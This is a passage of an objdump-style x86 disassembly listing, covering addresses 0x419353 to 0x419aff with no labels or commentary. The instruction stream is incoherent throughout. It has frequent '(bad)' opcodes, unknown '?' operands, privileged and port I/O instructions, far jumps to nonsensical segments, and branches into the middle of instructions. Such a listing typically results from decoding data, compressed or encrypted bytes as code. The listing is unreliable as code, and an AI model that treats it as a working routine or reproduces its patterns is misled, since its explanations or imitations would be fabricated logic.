  419353:	stos   BYTE PTR es:[edi],al
  419354:	jne    0x419390
  419356:	fldcw  WORD PTR [ecx-0x72]
  419359:	outs   dx,BYTE PTR ds:[esi]
  41935a:	addr16 in eax,dx
  41935c:	jae    0x419392
  41935e:	mov    edi,0xc185f456
  419363:	test   eax,0x7d9b3d90
  419368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419369:	sbb    al,0xce
  41936b:	adc    al,0xec
  41936d:	dec    esi
  41936e:	xor    eax,0x7044211a
  419373:	xlat   BYTE PTR ds:[ebx]
  419374:	ror    ebx,0x9
  419377:	mov    edx,0xfe6f7844
  41937c:	loop   0x41935d
  41937e:	mov    esp,0xd205ed8a
  419383:	data16 sbb al,0x8b
  419386:	lds    esp,FWORD PTR [esi-0x3e]
  419389:	retf   0xc3c3
  41938c:	mov    ecx,0x4761bbba
  419391:	inc    esi
  419392:	dec    ecx
  419393:	mov    ebp,gs
  419395:	push   edi
  419396:	outs   dx,DWORD PTR ds:[esi]
  419397:	popf   
  419398:	(bad)  
  419399:	iret   
  41939a:	mov    ah,0x4e
  41939c:	scas   eax,DWORD PTR es:[edi]
  41939d:	add    dl,cl
  41939f:	(bad)  
  4193a0:	dec    ebp
  4193a1:	into   
  4193a2:	test   BYTE PTR [ebp+0x3a318406],dl
  4193a8:	pop    ss
  4193a9:	pop    ds
  4193aa:	sbb    dl,BYTE PTR [ebx]
  4193ac:	adc    al,0x9
  4193ae:	mov    ds:0xf908f182,ax
  4193b4:	jne    0x41938f
  4193b6:	inc    ebp
  4193b7:	jae    0x4193ac
  4193b9:	test   BYTE PTR [eax+0x62],0x94
  4193bd:	aas    
  4193be:	mov    ecx,ds
  4193c0:	hlt    
  4193c1:	jl     0x4193d6
  4193c3:	enter  0xf62f,0x2
  4193c7:	aad    0xdc
  4193c9:	neg    DWORD PTR [ebp+0xd]
  4193cc:	push   0x7a61f72e
  4193d1:	mov    dl,0x8a
  4193d3:	add    ebp,DWORD PTR [ebx]
  4193d5:	js     0x41942e
  4193d7:	daa    
  4193d8:	jmp    0xc36d:0x8402d549
  4193df:	adc    al,0x5b
  4193e1:	inc    ebx
  4193e2:	stos   BYTE PTR es:[edi],al
  4193e3:	inc    esi
  4193e4:	add    ah,BYTE PTR [ebp+esi*1+0x35]
  4193e8:	jmp    0xc6bf:0x63b84d96
  4193ef:	iret   
  4193f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193f1:	add    esp,DWORD PTR [ecx-0x4b]
  4193f4:	aad    0xbb
  4193f6:	sub    bh,0x89
  4193f9:	int3   
  4193fa:	xchg   edx,eax
  4193fb:	jb     0x419440
  4193fd:	sub    DWORD PTR [esi-0xab96061],0xffffffcd
  419404:	sbb    bh,cl
  419406:	addr16 test al,0x1b
  419409:	xchg   esi,eax
  41940a:	dec    ebx
  41940b:	je     0x4193e0
  41940d:	retf   0xd76d
  419410:	in     eax,dx
  419411:	les    ecx,FWORD PTR [esp+ebx*8]
  419414:	mov    dl,0xdf
  419416:	inc    ecx
  419417:	fdiv   DWORD PTR [ebp+0x28745fb5]
  41941d:	pop    eax
  41941e:	dec    DWORD PTR [ecx+edx*1+0x3e8a0e98]
  419425:	(bad)  
  419426:	aas    
  419427:	push   esi
  419428:	cdq    
  419429:	push   ds
  41942a:	out    0x6a,al
  41942c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41942d:	mov    al,BYTE PTR [ecx+eiz*1-0x58]
  419431:	sub    BYTE PTR [esi+0x4ebe108f],ah
  419437:	inc    ebp
  419438:	mov    bl,0x4a
  41943a:	loopne 0x41948b
  41943c:	push   ds
  41943d:	sub    BYTE PTR [edi-0x2b],ah
  419440:	jecxz  0x41946e
  419442:	push   edi
  419443:	xchg   ebp,eax
  419444:	nop
  419445:	stos   BYTE PTR es:[edi],al
  419446:	ja     0x4194ba
  419448:	xor    ecx,esi
  41944a:	ins    DWORD PTR es:[edi],dx
  41944b:	jno    0x4193d5
  41944d:	pop    ecx
  41944e:	jl     0x41947a
  419450:	mov    cl,0xeb
  419452:	sbb    DWORD PTR [ecx-0x4332f651],edi
  419458:	inc    ecx
  419459:	or     eax,0xdc3907d8
  41945e:	jmp    0x2bda:0x36292161
  419465:	ror    DWORD PTR [esp+ebp*8+0x78],1
  419469:	lea    edx,[eax-0x7]
  41946c:	xchg   edi,eax
  41946d:	rcl    BYTE PTR [eax+0x41cf35c5],1
  419473:	mov    ch,0x43
  419475:	add    al,0xcc
  419477:	pop    esi
  419478:	popa   
  419479:	jle    0x4194f0
  41947b:	push   0x22580d65
  419480:	pop    ss
  419481:	div    DWORD PTR ds:0x3376533f
  419487:	xor    DWORD PTR [esi-0x7f8631a2],0xe43427bd
  419491:	xor    eax,0x76
  419494:	dec    ecx
  419495:	and    eax,0xe2fe1605
  41949a:	in     al,0xa6
  41949c:	fist   DWORD PTR [ebx]
  41949e:	and    al,0x89
  4194a0:	aaa    
  4194a1:	ror    BYTE PTR [ecx+0x1f],1
  4194a4:	jmp    0x6b70c71f
  4194a9:	cld    
  4194aa:	and    DWORD PTR [ecx-0x19],ecx
  4194ad:	dec    ebx
  4194ae:	push   0x7d
  4194b0:	ret    0x4f73
  4194b3:	test   BYTE PTR [ebp+0x3a40f80b],dh
  4194b9:	test   BYTE PTR [ecx],bh
  4194bb:	daa    
  4194bc:	iret   
  4194bd:	retf   0x4ad0
  4194c0:	mov    ch,al
  4194c2:	retf   
  4194c3:	imul   DWORD PTR [ebp+0x57]
  4194c6:	iret   
  4194c7:	cmp    eax,0x8bf92040
  4194cc:	adc    bl,bl
  4194ce:	sbb    bl,bl
  4194d0:	xorps  xmm6,XMMWORD PTR [edx-0x16c716df]
  4194d7:	rcr    cl,0x75
  4194da:	sbb    BYTE PTR [edi+0x2bab4bb3],cl
  4194e0:	pop    edx
  4194e1:	sub    ch,BYTE PTR [eax+0x4a265aad]
  4194e7:	push   edi
  4194e8:	mov    ebp,ds
  4194ea:	loope  0x41950e
  4194ec:	xchg   edi,eax
  4194ed:	pop    ebp
  4194ee:	mov    DWORD PTR [eax+0x48],eax
  4194f1:	and    esp,DWORD PTR [edi+esi*1]
  4194f4:	pop    edx
  4194f5:	pop    eax
  4194f6:	or     al,0x17
  4194f8:	adc    al,0x3d
  4194fa:	and    BYTE PTR [ebp-0x7d654422],al
  419500:	xchg   edx,eax
  419501:	adc    bl,BYTE PTR [edi+0x156364eb]
  419507:	xor    BYTE PTR ss:[edx],0x7a
  41950b:	xchg   BYTE PTR gs:[ebx+edi*2-0x76],dh
  419510:	mov    BYTE PTR [edi-0x69],bl
  419513:	xor    ah,BYTE PTR [ebx-0x47]
  419516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419517:	pop    edi
  419518:	xchg   BYTE PTR [eax+ecx*8-0x4],bl
  41951c:	mov    al,0xb2
  41951e:	je     0x4194c8
  419520:	adc    ebp,DWORD PTR [ebx+0x4f]
  419523:	call   0xcd10:0x59877a0a
  41952a:	cs js  0x41950e
  41952d:	inc    esp
  41952e:	out    0x6,al
  419530:	mov    ecx,0x593a14b2
  419535:	xchg   ebx,eax
  419536:	mov    ebp,DWORD PTR [edx+edx*1]
  419539:	cmp    DWORD PTR [ebx+0x3e],edx
  41953c:	push   ebx
  41953d:	das    
  41953e:	push   ds
  41953f:	iret   
  419540:	or     BYTE PTR [edx],ah
  419542:	adc    BYTE PTR [edx-0x1cc18488],ch
  419548:	mov    ds:0x91e9e4d8,al
  41954d:	sahf   
  41954e:	fsub   st(1),st
  419550:	cld    
  419551:	mov    bl,0x90
  419553:	aaa    
  419554:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  419556:	pushf  
  419557:	sub    BYTE PTR [ebp+0x67df8f13],ah
  41955d:	mov    es,WORD PTR [ebp+0x6e]
  419560:	mov    ebp,0xb57b8f9a
  419565:	mov    al,ds:0x75db24ac
  41956a:	pusha  
  41956b:	lock dec edi
  41956d:	je     0x4195b1
  41956f:	xchg   esp,eax
  419570:	sbb    ecx,DWORD PTR [edx]
  419572:	(bad)  
  419574:	push   cs
  419575:	adc    eax,0xa59af729
  41957a:	or     DWORD PTR [ebx+eiz*4-0x23],0xf597d516
  419582:	add    cl,BYTE PTR ds:0x4531b42f
  419588:	xor    eax,eax
  41958a:	fsubr  DWORD PTR [esi]
  41958c:	mov    ebx,0x884454b5
  419591:	jnp    0x41959e
  419593:	imul   eax
  419595:	sbb    esi,DWORD PTR [edx-0x2b93229d]
  41959b:	add    esp,DWORD PTR [edx+0x7ffca0c6]
  4195a1:	or     ebx,esp
  4195a3:	(bad)  
  4195a4:	mov    es,WORD PTR [ebp-0x25]
  4195a7:	imul   esp,ebx,0x64f8abe
  4195ad:	cmp    eax,0xe419ccb2
  4195b2:	dec    ecx
  4195b3:	int3   
  4195b4:	mov    ebx,0xc34db2c7
  4195b9:	clc    
  4195ba:	mov    ebp,ebx
  4195bc:	add    eax,0x3d559d6a
  4195c1:	adc    BYTE PTR [edi],ch
  4195c3:	in     al,dx
  4195c4:	jl     0x419578
  4195c6:	xor    ebp,ebx
  4195c8:	sahf   
  4195c9:	pop    edx
  4195ca:	pop    es
  4195cb:	or     ebp,ebp
  4195cd:	outs   dx,DWORD PTR ds:[esi]
  4195ce:	adc    BYTE PTR [ebx-0x37],bl
  4195d1:	pop    esp
  4195d2:	mov    ?,WORD PTR [esi+0x2b]
  4195d5:	fwait
  4195d6:	sbb    DWORD PTR [edi-0x78dd776c],ebx
  4195dc:	adc    DWORD PTR [edx+0x492af76e],0x10
  4195e3:	or     eax,0x3de970db
  4195e8:	imul   BYTE PTR [ebp-0x53]
  4195eb:	loop   0x4195d0
  4195ed:	shr    DWORD PTR [eax+0x57],1
  4195f0:	and    BYTE PTR [ebx+0x5b],cl
  4195f3:	adc    ecx,DWORD PTR [ebp+eax*1+0x3ec36c76]
  4195fa:	test   DWORD PTR [edx],0xfc727e84
  419600:	fild   DWORD PTR [esi-0x29]
  419603:	sar    DWORD PTR [edx],cl
  419605:	cmp    BYTE PTR [ebx+eax*8-0x5b],bl
  419609:	dec    ebx
  41960a:	push   eax
  41960b:	inc    ebp
  41960c:	jo     0x4195c0
  41960e:	(bad)  
  41960f:	loopne 0x419624
  419611:	aad    0xa
  419613:	into   
  419614:	lea    ecx,[ebp+0x1]
  419617:	aad    0x24
  419619:	lock push edx
  41961b:	or     eax,0x319460bd
  419620:	jp     0x4195a6
  419622:	aas    
  419623:	scas   al,BYTE PTR es:[edi]
  419624:	mov    dh,0x19
  419626:	dec    esp
  419627:	xor    esp,DWORD PTR [eax]
  419629:	sti    
  41962a:	jg     0x419622
  41962c:	jo     0x41965c
  41962e:	ret    
  41962f:	cld    
  419630:	sti    
  419631:	out    0x7d,al
  419633:	das    
  419634:	push   eax
  419635:	cmp    al,0xc6
  419637:	(bad)  
  419638:	and    eax,0xd40d8b91
  41963d:	mov    edx,0x9d20b6d3
  419642:	sub    al,0x5f
  419644:	not    eax
  419646:	mov    ah,0x56
  419648:	dec    eax
  419649:	and    eax,0x8f22bbe7
  41964e:	cmp    DWORD PTR [eax+0x2b],ebp
  419651:	data16 and BYTE PTR [ebp-0x31],bh
  419655:	daa    
  419656:	and    BYTE PTR [ebx+0x13],ah
  419659:	jmp    0xdac9:0xed3b4c12
  419660:	jne    0x41965b
  419662:	push   es
  419663:	push   cs
  419664:	int    0x67
  419666:	fidiv  DWORD PTR [ebx+0x5a]
  419669:	leave  
  41966a:	mov    ds:0x253c8d3b,eax
  41966f:	adc    DWORD PTR cs:[edi],esi
  419672:	pop    es
  419673:	and    BYTE PTR [edi+0x2b9a53a4],dh
  419679:	es push eax
  41967b:	mov    ecx,0x7c9cae19
  419680:	loopne 0x419603
  419682:	loopne 0x4196d5
  419684:	sbb    esp,0x54
  419687:	sti    
  419688:	dec    ecx
  419689:	adc    al,0xc
  41968b:	pop    es
  41968c:	in     eax,0xff
  41968e:	pusha  
  41968f:	mov    bl,0x4d
  419691:	in     al,0x90
  419693:	adc    DWORD PTR [eax-0x1b1cb900],edi
  419699:	ror    ecx,0xc2
  41969c:	jo     0x419665
  41969e:	rol    DWORD PTR [ebp-0x4f],1
  4196a1:	lock clc 
  4196a3:	sar    BYTE PTR [ecx+eiz*2+0x30112daa],0x5f
  4196ab:	xor    al,0xff
  4196ad:	cld    
  4196ae:	(bad)  
  4196af:	xlat   BYTE PTR ds:[ebx]
  4196b0:	mov    al,ds:0xdc71c6b1
  4196b5:	mov    dl,0x9e
  4196b7:	cmp    eax,ebx
  4196b9:	push   es
  4196ba:	jns    0x41967d
  4196bc:	rcl    BYTE PTR [edx-0x16],0x6b
  4196c0:	jmp    0x419726
  4196c2:	rcl    bh,cl
  4196c4:	pop    ebp
  4196c5:	push   eax
  4196c6:	push   0xdf234960
  4196cb:	sbb    al,0xc8
  4196cd:	pop    ecx
  4196ce:	xchg   esi,eax
  4196cf:	(bad)  
  4196d0:	div    DWORD PTR [edi]
  4196d2:	inc    edx
  4196d3:	shl    DWORD PTR [eax-0x4e048997],1
  4196d9:	xchg   esp,eax
  4196da:	xor    DWORD PTR [edi-0x54],ebx
  4196dd:	mov    al,0x89
  4196df:	fsubr  DWORD PTR [eax-0x500a2158]
  4196e5:	int    0x48
  4196e7:	sbb    dh,al
  4196e9:	mov    ch,0xa8
  4196eb:	neg    BYTE PTR [ebp-0x1c]
  4196ee:	addr16 adc al,0x92
  4196f1:	mov    WORD PTR [esi+0x7a],ss
  4196f4:	lea    edi,[eax]
  4196f6:	pop    ss
  4196f7:	imul   edi,DWORD PTR [esi+0x22],0xffffffcb
  4196fb:	stos   DWORD PTR es:[edi],eax
  4196fc:	mov    cs,WORD PTR ss:[esp+ecx*8]
  419700:	jnp    0x4196c9
  419702:	scas   al,BYTE PTR es:[edi]
  419703:	push   ebp
  419704:	retf   
  419705:	stos   DWORD PTR es:[edi],eax
  419706:	inc    eax
  419707:	and    al,0xdd
  419709:	jmp    FWORD PTR [ecx+0x3acfc171]
  41970f:	fsubr  DWORD PTR [edi-0x6]
  419712:	cld    
  419713:	jnp    0x419747
  419715:	dec    edx
  419716:	inc    edi
  419717:	pop    ebx
  419718:	in     al,dx
  419719:	stc    
  41971a:	and    edx,edx
  41971c:	icebp  
  41971d:	jae    0x41972b
  41971f:	ins    DWORD PTR es:[edi],dx
  419720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419721:	adc    BYTE PTR [esi-0x71],dh
  419724:	loope  0x419771
  419726:	stos   BYTE PTR es:[edi],al
  419727:	or     BYTE PTR [esi+edx*2+0x2ecfccab],0x25
  41972f:	ins    DWORD PTR es:[edi],dx
  419730:	or     BYTE PTR [ebp+0x16a62654],bh
  419736:	sar    BYTE PTR [esi+ebp*4],1
  419739:	mov    bh,0x34
  41973b:	popa   
  41973c:	xor    DWORD PTR [edi+ebx*1],esi
  41973f:	cmc    
  419740:	aaa    
  419741:	imul   esi,DWORD PTR [edx+0x47],0xffffffa5
  419745:	mov    ecx,0xca19e5a9
  41974a:	inc    ebx
  41974b:	mov    ds:0x93bdbb7a,al
  419750:	jnp    0x4196ff
  419752:	or     eax,0xe9a7065f
  419757:	ror    BYTE PTR [esi-0x51],cl
  41975a:	xlat   BYTE PTR ds:[ebx]
  41975b:	xchg   ebx,eax
  41975c:	sbb    al,0x7d
  41975e:	outs   dx,DWORD PTR ds:[esi]
  41975f:	test   DWORD PTR [edi+0x49],ebx
  419762:	jne    0x41977a
  419764:	dec    esi
  419765:	imul   ebp,DWORD PTR [ebx-0x2296382c],0x35fd73b7
  41976f:	bound  esi,QWORD PTR [ecx-0x80]
  419772:	iret   
  419773:	sbb    BYTE PTR [esi],cl
  419775:	mov    ebp,0x4dcfa498
  41977a:	inc    ebp
  41977b:	pop    ebp
  41977c:	push   ebp
  41977d:	add    ch,ah
  41977f:	push   esp
  419780:	mov    ch,0x40
  419782:	sub    DWORD PTR [ebp-0x4ccc5b43],eax
  419788:	adc    al,0xbe
  41978a:	mov    al,ds:0xc748f4b3
  41978f:	inc    ecx
  419790:	push   0x1fe1e279
  419795:	xor    eax,0x703ea3a5
  41979a:	inc    esp
  41979b:	add    BYTE PTR [eax-0x19],ah
  41979e:	(bad)  
  41979f:	pop    eax
  4197a0:	jb     0x419768
  4197a2:	inc    ebp
  4197a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197a4:	cmp    BYTE PTR [ebx],0x77
  4197a7:	jns    0x41981b
  4197a9:	inc    edi
  4197aa:	xor    al,BYTE PTR [esi+0x17e0c5dd]
  4197b0:	jno    0x4197d2
  4197b2:	adc    DWORD PTR [edi+ebp*8-0x78],0x4e6124f6
  4197ba:	cwde   
  4197bb:	mov    edx,0xff683ac4
  4197c0:	xor    DWORD PTR [ecx],edi
  4197c2:	test   bl,0xea
  4197c5:	xchg   esi,eax
  4197c6:	xchg   esi,eax
  4197c7:	cs lahf 
  4197c9:	hlt    
  4197ca:	dec    DWORD PTR [ecx-0x4652b5f3]
  4197d0:	push   ebx
  4197d1:	int3   
  4197d2:	xchg   BYTE PTR [ebp-0x3e8f7fca],cl
  4197d8:	push   esp
  4197d9:	and    dl,BYTE PTR [di-0x5f]
  4197dd:	mov    al,0x93
  4197df:	mov    ecx,0x5c469b81
  4197e4:	push   eax
  4197e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e6:	icebp  
  4197e7:	lock aaa 
  4197e9:	pcmpeqw mm6,QWORD PTR [edi+0x14]
  4197ed:	stc    
  4197ee:	lahf   
  4197ef:	push   ecx
  4197f0:	push   es
  4197f1:	(bad)  
  4197f2:	xor    ch,BYTE PTR [eax+eax*4]
  4197f5:	xor    eax,0x8c88c892
  4197fa:	jmp    0x37ed:0x66adfee5
  419801:	dec    ebp
  419802:	out    dx,al
  419803:	xor    al,0xf0
  419805:	push   ecx
  419806:	sbb    BYTE PTR [eax+0x63],al
  419809:	out    0x80,al
  41980b:	jmp    0xb309:0xabad709a
  419812:	xchg   ch,dh
  419814:	mov    BYTE PTR [eax-0x21],dl
  419817:	xor    eax,0x8cdb3385
  41981c:	jns    0x4197ce
  41981e:	jmp    FWORD PTR [esi+ecx*4]
  419821:	xchg   esi,eax
  419822:	mov    esp,0xbc8e40fa
  419827:	out    dx,al
  419828:	cld    
  419829:	clc    
  41982a:	sub    dh,BYTE PTR [eax+0x1d61fc23]
  419830:	sbb    eax,0x300a38d9
  419835:	rol    DWORD PTR [edx-0xaf11fdb],1
  41983b:	adc    BYTE PTR [edi-0x5],0xdd
  41983f:	push   ds
  419840:	add    DWORD PTR [edx],ebp
  419842:	lea    esi,[ebx+eiz*4-0xf2e95a4]
  419849:	dec    eax
  41984a:	adc    DWORD PTR [ebp+0x5],0xffffffd3
  41984e:	cmc    
  41984f:	iret   
  419850:	push   ds
  419851:	les    ecx,FWORD PTR [ebx-0x60dd23b9]
  419857:	push   cs
  419858:	and    BYTE PTR [edi-0x277aa75f],bh
  41985e:	push   ecx
  41985f:	(bad)  
  419860:	or     dh,BYTE PTR ds:[esi-0x26f3c3ac]
  419867:	inc    ecx
  419868:	retf   
  419869:	ss (bad) 
  41986b:	cmp    DWORD PTR [ecx-0x3c2360ff],esi
  419871:	repz rcl BYTE PTR [eax],cl
  419874:	cmp    edi,DWORD PTR [edx+0x258de3db]
  41987a:	mov    ebx,0x9118f240
  41987f:	in     eax,0x59
  419881:	mov    eax,ds:0x1f71b8f5
  419886:	jmp    0xec889756
  41988b:	push   edi
  41988c:	xor    BYTE PTR [edx+0x78],0x76
  419890:	cli    
  419891:	push   ecx
  419892:	out    0x89,al
  419894:	cmp    al,0x63
  419896:	int    0xf5
  419898:	inc    eax
  419899:	mov    cl,0x1a
  41989b:	mov    cl,0x66
  41989d:	fsub   DWORD PTR [edi+edi*1+0x50]
  4198a1:	fdivr  DWORD PTR [ebx+0x2705700a]
  4198a7:	sbb    eax,0xaca0b944
  4198ac:	xor    eax,edi
  4198ae:	sbb    al,0xd7
  4198b0:	lahf   
  4198b1:	or     al,BYTE PTR [edx-0x5f572e29]
  4198b7:	push   ds
  4198b8:	sahf   
  4198b9:	lds    ebx,FWORD PTR [ebx]
  4198bb:	imul   ecx,DWORD PTR [ecx+0x4fcd6193],0x2c5cbfe7
  4198c5:	lods   al,BYTE PTR ds:[esi]
  4198c6:	mov    al,0x25
  4198c8:	mov    dh,0x49
  4198ca:	sub    bl,BYTE PTR [edi-0x65]
  4198cd:	loopne 0x419911
  4198cf:	jae    0x41994a
  4198d1:	mul    ah
  4198d3:	cmp    dl,BYTE PTR [edi]
  4198d5:	sub    ecx,esp
  4198d7:	pop    ds
  4198d8:	in     eax,dx
  4198d9:	mov    ds:0x7e7d91ee,al
  4198de:	icebp  
  4198df:	(bad)  
  4198e1:	cmc    
  4198e2:	stos   DWORD PTR es:[edi],eax
  4198e3:	sbb    BYTE PTR [eax+0x40],cl
  4198e6:	push   eax
  4198e7:	sub    al,0xb
  4198e9:	adc    BYTE PTR [ebp+0x14ddc211],ch
  4198ef:	sti    
  4198f0:	xchg   edi,eax
  4198f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f2:	xchg   ebp,eax
  4198f3:	jmp    0x419920
  4198f5:	out    0x3,eax
  4198f7:	pop    ss
  4198f8:	repnz outs dx,BYTE PTR ds:[esi]
  4198fa:	xchg   ebx,eax
  4198fb:	cmp    al,0x88
  4198fd:	adc    DWORD PTR [ebx+0x52],ecx
  419900:	adc    DWORD PTR [ecx+0x36],esp
  419903:	or     DWORD PTR ds:0x8ff46753,edx
  419909:	stos   BYTE PTR es:[edi],al
  41990a:	out    dx,al
  41990b:	pop    eax
  41990c:	das    
  41990d:	loope  0x4198cc
  41990f:	xor    al,0x16
  419911:	xor    ah,BYTE PTR [ebx]
  419913:	fbld   TBYTE PTR [ebp+0x1d]
  419916:	test   edi,ecx
  419918:	dec    edi
  419919:	pop    ss
  41991a:	mov    cl,al
  41991c:	inc    eax
  41991d:	mov    DWORD PTR [ebx-0x31],0x6bf363e6
  419924:	push   edx
  419925:	out    dx,eax
  419926:	push   ss
  419927:	dec    ebp
  419928:	pop    ebp
  419929:	dec    ecx
  41992a:	(bad)  
  41992b:	(bad)  ds:0xcaee0a03
  419931:	icebp  
  419932:	xor    eax,0x42f54524
  419937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419938:	dec    edi
  419939:	or     ebx,DWORD PTR [eax]
  41993b:	imul   eax,DWORD PTR [ebp+0x57],0xffffffdf
  41993f:	stos   DWORD PTR es:[edi],eax
  419940:	inc    esi
  419941:	ds and al,0xab
  419944:	mov    ch,0x41
  419946:	jae    0x4198cd
  419948:	adc    edi,DWORD PTR [edi+0x1e]
  41994b:	push   ss
  41994c:	test   esp,ebp
  41994e:	push   es
  41994f:	in     eax,0x90
  419951:	cld    
  419952:	xor    eax,DWORD PTR [ebx]
  419954:	shl    BYTE PTR [edx],0xfb
  419957:	shl    al,cl
  419959:	test   DWORD PTR [esi-0x35],eax
  41995c:	(bad)  
  41995d:	daa    
  41995e:	ret    0x7d7b
  419961:	fs ret 
  419963:	scas   eax,DWORD PTR es:[edi]
  419964:	add    ebx,DWORD PTR ds:0x5aa765d9
  41996a:	xor    ebp,DWORD PTR [ebx]
  41996c:	outs   dx,DWORD PTR ds:[esi]
  41996d:	ins    DWORD PTR es:[edi],dx
  41996e:	mov    ds:0x558849ae,al
  419973:	mov    ecx,0xe35214e8
  419978:	sbb    dl,BYTE PTR [edx-0x6f]
  41997b:	rcr    DWORD PTR [edx+0xe1692c5],cl
  419981:	jnp    0x419977
  419983:	push   0x35c02a03
  419988:	cwde   
  419989:	cmp    bl,BYTE PTR [esp+eax*4]
  41998c:	mov    ah,0x95
  41998e:	aam    0xb
  419990:	cmp    DWORD PTR [ecx],esi
  419992:	ret    
  419993:	xchg   esp,eax
  419994:	inc    edi
  419995:	jp     0x41995d
  419997:	popf   
  419998:	mov    cl,0xaf
  41999a:	mov    ds:0x93e191e4,eax
  41999f:	dec    ebx
  4199a0:	(bad)  
  4199a1:	xchg   ebx,eax
  4199a2:	ror    BYTE PTR [edx+edi*4+0x38],cl
  4199a6:	adc    BYTE PTR [eax],ch
  4199a8:	cs sbb al,0xc4
  4199ab:	mov    cl,0x91
  4199ad:	mov    al,cl
  4199af:	mov    cl,0x5e
  4199b1:	jl     0x419a0e
  4199b3:	sbb    al,0x71
  4199b5:	shr    edi,cl
  4199b7:	xor    ah,dl
  4199b9:	push   esi
  4199ba:	sub    BYTE PTR [eiz*4+0x6cfdba89],0x6
  4199c2:	pop    edi
  4199c3:	ficomp DWORD PTR [esi+eax*4-0x632926f2]
  4199ca:	sub    ebp,eax
  4199cc:	jg     0x41999b
  4199ce:	sbb    al,0x55
  4199d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199d1:	movzx  edi,BYTE PTR [ecx]
  4199d4:	inc    edx
  4199d5:	and    eax,0xcc525fbe
  4199da:	cmp    BYTE PTR [eax],0x58
  4199dd:	jne    0x4199b2
  4199df:	icebp  
  4199e0:	mov    al,ds:0x4b5651ae
  4199e5:	imul   DWORD PTR cs:[esi+0x4c]
  4199e9:	mov    ecx,0xc9230d4e
  4199ee:	int    0x96
  4199f0:	(bad)
  4199f4:	jnp    0x4199c7
  4199f6:	dec    esp
  4199f7:	push   ebp
  4199f8:	inc    ecx
  4199f9:	lods   al,BYTE PTR ds:[esi]
  4199fa:	add    ebx,DWORD PTR [ebp+0x8]
  4199fd:	mov    edi,DWORD PTR [ecx-0x3f02b0a8]
  419a03:	push   edi
  419a04:	std    
  419a05:	ja     0x4199f0
  419a07:	inc    edx
  419a08:	lahf   
  419a09:	jge    0x41998d
  419a0b:	lods   eax,DWORD PTR ds:[esi]
  419a0d:	push   edx
  419a0e:	mov    ebx,DWORD PTR [ecx-0x2f]
  419a11:	jno    0x4199bb
  419a13:	fnstcw WORD PTR [ebx+0x1186094d]
  419a19:	std    
  419a1a:	inc    edx
  419a1b:	aaa    
  419a1c:	inc    edx
  419a1d:	in     eax,0xc8
  419a1f:	cwde   
  419a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a22:	enter  0xf168,0xd0
  419a26:	cwde   
  419a27:	inc    ebx
  419a28:	fsub   DWORD PTR [ebx+0xc]
  419a2b:	add    eax,0x6546d438
  419a30:	lock push eax
  419a32:	loop   0x4199fb
  419a34:	mov    bl,0x8
  419a36:	sub    ecx,DWORD PTR ds:0xe8a97050
  419a3c:	mov    ebx,0x997a33a9
  419a41:	mov    ecx,0x69dd3893
  419a46:	in     al,dx
  419a47:	adc    bh,ch
  419a49:	push   es
  419a4a:	xchg   al,bh
  419a4c:	cmp    eax,0x9502200e
  419a51:	pop    ebp
  419a52:	pop    ss
  419a53:	mov    cl,0xc
  419a55:	add    esp,DWORD PTR [ebp+0x38]
  419a58:	(bad)  
  419a59:	mov    ecx,0xd99a8e25
  419a5e:	pop    esp
  419a5f:	leave  
  419a60:	fistp  QWORD PTR [ebx-0x39]
  419a63:	fwait
  419a64:	sub    DWORD PTR [edx+0x4f],esp
  419a67:	mov    dl,BYTE PTR [esp+ecx*4-0x54]
  419a6b:	pop    ebx
  419a6c:	hlt    
  419a6d:	xchg   ebp,eax
  419a6e:	je     0x419a2f
  419a70:	fwait
  419a71:	and    esp,DWORD PTR [edx+0x57]
  419a74:	jnp    0x419abe
  419a76:	or     dl,BYTE PTR [ecx-0x74]
  419a79:	ins    DWORD PTR es:[edi],dx
  419a7a:	icebp  
  419a7b:	sub    DWORD PTR [ecx-0x18df7761],edi
  419a81:	imul   esi,edi,0x22c019f4
  419a87:	dec    ecx
  419a88:	aaa    
  419a89:	mov    ebp,0xbe9b1272
  419a8e:	loopne 0x419ae7
  419a90:	push   ebx
  419a91:	mov    ebp,edx
  419a93:	dec    edi
  419a94:	mov    al,ds:0x82f6e88
  419a99:	mov    ?,WORD PTR [ecx+0x3fe42c9b]
  419a9f:	cld    
  419aa0:	pop    esi
  419aa1:	(bad)  
  419aa2:	(bad)  
  419aa3:	test   ecx,0x65360462
  419aa9:	sbb    ecx,DWORD PTR [esi]
  419aab:	jns    0x419ad6
  419aad:	ins    BYTE PTR es:[edi],dx
  419aae:	cmp    eax,0x96868330
  419ab3:	(bad)  
  419ab4:	add    BYTE PTR [ebp-0xb],dh
  419ab7:	jecxz  0x419b26
  419ab9:	icebp  
  419aba:	push   ss
  419abb:	jo     0x419afe
  419abd:	pusha  
  419abe:	movsx  esp,al
  419ac1:	fild   WORD PTR [edx+0x19ae7b0c]
  419ac7:	mov    ?,WORD PTR [ebp-0xe9f0937]
  419acd:	clc    
  419ace:	jnp    0x419b0a
  419ad0:	lods   eax,DWORD PTR ds:[esi]
  419ad1:	inc    edx
  419ad2:	pop    ds
  419ad3:	xlat   BYTE PTR ds:[ebx]
  419ad4:	mov    al,0xb7
  419ad6:	stos   BYTE PTR es:[edi],al
  419ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad8:	mov    BYTE PTR [esi],0xdd
  419adb:	cld    
  419adc:	adc    cl,dh
  419ade:	push   edi
  419adf:	xor    esi,0xa63f1c30
  419ae5:	in     al,0x83
  419ae7:	mov    bh,0x5d
  419ae9:	shl    dl,1
  419aeb:	icebp  
  419aec:	in     eax,0x66
  419aee:	es pop esp
  419af0:	shl    BYTE PTR [eax-0x5d],1
  419af3:	data16 add al,0xb6
  419af6:	sbb    ecx,DWORD PTR [ecx-0x20]
  419af9:	and    bl,BYTE PTR [edx+0x48ad4c0]
  419aff:	imul   edi,DWORD PTR [edi-0x97f231f],0x5d8f47e0
